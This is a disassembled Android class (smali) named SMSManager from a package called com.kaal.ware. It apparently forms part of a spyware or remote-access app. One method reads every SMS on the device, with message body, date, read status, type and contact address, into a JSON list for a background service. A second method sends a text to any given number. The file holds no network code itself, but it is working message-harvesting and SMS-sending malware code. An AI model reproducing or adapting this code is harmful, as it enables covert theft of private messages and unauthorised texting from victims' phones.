.class public Lcom/kaal/ware/SMSManager;
.super Ljava/lang/Object;
.source "SMSManager.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getsms()Lorg/json/JSONObject;
    .registers 22

    .line 15
    const-string v0, "read"

    const-string v1, "date"

    const-string v2, "body"

    const-string v3, "type"

    const/4 v4, 0x0

    .line 16
    .local v4, "result":Lorg/json/JSONObject;
    const/4 v5, 0x0

    .line 20
    .local v5, "jarray":Lorg/json/JSONArray;
    :try_start_a
    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6}, Lorg/json/JSONArray;-><init>()V

    move-object v5, v6

    .line 22
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    move-object v4, v6

    .line 23
    const-string v6, "content://sms/"

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v8

    .line 24
    .local v8, "uri":Landroid/net/Uri;
    invoke-static {}, Lcom/kaal/ware/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v6

    .line 25
    .local v6, "act":Landroid/content/Context;
    invoke-virtual {v6}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v12, 0x0

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 28
    .local v7, "c":Landroid/database/Cursor;
    invoke-interface {v7}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v9

    if-eqz v9, :cond_143

    .line 30
    const/4 v9, 0x0

    .local v9, "i":I
    :goto_33
    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I

    move-result v10

    if-ge v9, v10, :cond_143

    .line 32
    invoke-interface {v7, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v2, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 34
    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v1, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 35
    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v0, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 36
    invoke-interface {v7, v3}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v3, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 37
    invoke-interface {v7, v3}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    const-string v11, "3"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10
    :try_end_87
    .catch Ljava/lang/IllegalArgumentException; {:try_start_a .. :try_end_87} :catch_152
    .catch Lorg/json/JSONException; {:try_start_a .. :try_end_87} :catch_14d

    const-string v11, "address"

    if-eqz v10, :cond_11c

    .line 38
    :try_start_8b
    const-string v10, "thread_id"

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v7, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    .line 39
    .local v10, "threadid":Ljava/lang/String;
    invoke-virtual {v6}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v12

    const-string v13, "content://mms-sms/conversations?simple=true"

    invoke-static {v13}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v13

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, "_id ="

    invoke-virtual {v15, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    const/16 v17, 0x0

    const/16 v18, 0x0

    const/4 v14, 0x0

    move-object/from16 v16, v17

    move-object/from16 v17, v18

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    .line 40
    .local v12, "cur":Landroid/database/Cursor;
    invoke-interface {v12}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v13

    if-eqz v13, :cond_117

    .line 41
    const-string v13, "recipient_ids"

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v13

    .line 42
    .local v13, "recipientId":Ljava/lang/String;
    invoke-virtual {v6}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v14

    const-string v15, "content://mms-sms/canonical-addresses"

    invoke-static {v15}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v15

    const/16 v16, 0x0

    move-object/from16 v20, v0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v21, v1

    const-string v1, "_id = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    const/16 v18, 0x0

    const/16 v19, 0x0

    invoke-virtual/range {v14 .. v19}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    .line 43
    .end local v12    # "cur":Landroid/database/Cursor;
    .local v0, "cur":Landroid/database/Cursor;
    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_11b

    .line 44
    invoke-interface {v0, v11}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v1

    .line 45
    .local v1, "address":Ljava/lang/String;
    invoke-virtual {v4, v11, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 46
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    goto :goto_11b

    .line 40
    .end local v0    # "cur":Landroid/database/Cursor;
    .end local v1    # "address":Ljava/lang/String;
    .end local v13    # "recipientId":Ljava/lang/String;
    .restart local v12    # "cur":Landroid/database/Cursor;
    :cond_117
    move-object/from16 v20, v0

    move-object/from16 v21, v1

    .line 50
    .end local v10    # "threadid":Ljava/lang/String;
    .end local v12    # "cur":Landroid/database/Cursor;
    :cond_11b
    :goto_11b
    goto :goto_12f

    .line 51
    :cond_11c
    move-object/from16 v20, v0

    move-object/from16 v21, v1

    invoke-interface {v7, v11}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v11, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 53
    :goto_12f
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 54
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    move-object v4, v0

    .line 56
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    .line 30
    add-int/lit8 v9, v9, 0x1

    move-object/from16 v0, v20

    move-object/from16 v1, v21

    goto/16 :goto_33

    .line 59
    .end local v9    # "i":I
    :cond_143
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 61
    const-string v0, "smslist"

    invoke-virtual {v4, v0, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_14b
    .catch Ljava/lang/IllegalArgumentException; {:try_start_8b .. :try_end_14b} :catch_152
    .catch Lorg/json/JSONException; {:try_start_8b .. :try_end_14b} :catch_14d

    .line 69
    nop

    .end local v6    # "act":Landroid/content/Context;
    .end local v7    # "c":Landroid/database/Cursor;
    .end local v8    # "uri":Landroid/net/Uri;
    goto :goto_157

    .line 66
    :catch_14d
    move-exception v0

    .line 68
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_157

    .line 63
    .end local v0    # "e":Lorg/json/JSONException;
    :catch_152
    move-exception v0

    .line 65
    .local v0, "e":Ljava/lang/IllegalArgumentException;
    invoke-virtual {v0}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    .line 69
    .end local v0    # "e":Ljava/lang/IllegalArgumentException;
    nop

    .line 70
    :goto_157
    return-object v4
.end method

.method public static sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
    .registers 8
    .param p0, "phoneNo"    # Ljava/lang/String;
    .param p1, "msg"    # Ljava/lang/String;

    .line 75
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 76
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v1, p0

    move-object v3, p1

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_c} :catch_e

    .line 77
    const/4 v1, 0x1

    return v1

    .line 78
    .end local v0    # "smsManager":Landroid/telephony/SmsManager;
    :catch_e
    move-exception v0

    .line 79
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 80
    const/4 v1, 0x0

    return v1
.end method
